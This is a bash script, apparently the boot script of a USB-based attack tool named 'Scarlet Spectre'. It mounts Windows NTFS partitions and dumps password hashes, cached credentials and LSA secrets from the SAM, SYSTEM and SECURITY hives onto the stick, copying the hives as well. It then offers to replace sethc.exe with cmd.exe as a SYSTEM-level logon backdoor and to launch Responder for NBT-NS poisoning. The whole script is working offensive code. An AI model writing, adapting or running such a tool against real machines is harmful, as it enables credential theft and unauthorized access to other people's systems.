#!/bin/bash
exec > /dev/tty1
exec < /dev/tty1
cd /spectre/
#A opção -p no read não estava funcionando e eu não tinha paciência para descobrir o motivo
clear
cat /spectre/banner
echo " -----------------------------------"
echo "| Scarlet Spectre Started!          |"
echo " -----------------------------------"
echo "Seeking and mounting NTFS partitions"
mkdir /hds/ -p
mkdir -p /hds/pendrive
mount -t vfat -o rw,force  $(blkid | grep -i "Scarlet" | cut -d':' -f1) /hds/pendrive
for device in $(blkid | grep -i "NTFS" | cut -d':' -f1) ; do 
	mounted="/hds/"$(basename $device)
	mkdir -p $mounted
	mount -t ntfs-3g -o rw,force $device $mounted
	if [ -d $mounted/Windows ]; then
	       	echo "Found Windows installed on $device!"
		system32=$mounted/Windows/System32
		echo $system32
		python ./creddump7/pwdump.py "$system32/config/SYSTEM" "$system32/config/SAM" "true" | tee -a /hds/pendrive/credentials.log
		python ./creddump7/cachedump.py $system32/config/SYSTEM $system32/config/SECURITY true | tee -a /hds/pendrive/credentials.log
		python ./creddump7/lsadump.py $system32/config/SYSTEM $system32/config/SECURITY true | tee -a /hds/pendrive/credentials.log
		echo "Copying registry hives..."
		mkdir -p /hds/pendrive/hives
		cp $system32/config/{SYSTEM,SECURITY,SAM,SOFTWARE} /hds/pendrive/hives/
		echo "Do you want to replace sethc.exe with cmd.exe (press shift 5x on logon screen for a prompt as System)? y/N: "
		read -n 1 -s -r temp
		if [ "$temp" == "y"  ] || [ "$temp" == "Y"  ]; then
			echo -e "\nReplacing sethc.exe..."
			cp $system32/sethc.exe $system32/sethc_.exe
			cp $system32/cmd.exe $system32/sethc.exe
		fi
	fi
done
echo "Do you want to start an NBT-DS poisoning attack? (y/N)"
read -n 1 -s -r temp
if ( [ "$temp" == "y" ] || [ "$temp" == "Y" ] ) && [ -d "$mounted" ]; then
	echo "Available interfaces:"
	option=0
	interfaces=()
	for interface in /sys/class/net/*; do 
		interface="$(basename $interface)"
		interfaces+=($interface)
		echo "$option - $interface"
		let "option+=1"
	done
	echo "Enter the number of the network interface you want to configure: "
	read -n 1 -s -r selected
	echo "Trying to setup ${interfaces[$selected]} using DHCP..."
	dhclient ${interfaces[$selected]}
	if [ -d "/var/lib/dhcp/dhclient.leases" ] && [ "$( cat /var/lib/dhcp/dhclient.leases | grep ${interfaces[$selected]} )" != ""  ]; then 
		mkdir -p /hds/pendrive/ResponderLogs/
		rm -r ./Responder/logs/
		ln -s /hds/pendrive/ResponderLogs/ Responder/logs
		python ./Responder/Responder.py -I ${interfaces[$selected]} 	
	else
		echo "Unable to setup networking using DHCP, do you want to try to read network setup data from Windows Registry? (y/N): " 
		read -n 1 -s -r temp
		if [ "$temp" == "Y" ] || [ "$temp" == "y" ]; then 
			python ./setupInterfaceFromWinReg.py $system32/config/SYSTEM ${interfaces[$selected]}
			mkdir -p /hds/pendrive/ResponderLogs/
			rm -r Responder/logs/
			ln -s /hds/pendrive/ResponderLogs/ Responder/logs
			service network-manager restart
			python ./Responder/Responder.py -I ${interfaces[$selected]} 	
		fi
	fi
fi

echo "Scarlet Spectre successfully deployed!"
echo "Press R to reboot or anything for a Debian shell" 
read -n 1 -s -r temp
if [ "$temp" == "r" ] ; then
	reboot
fi
clear

exit 0

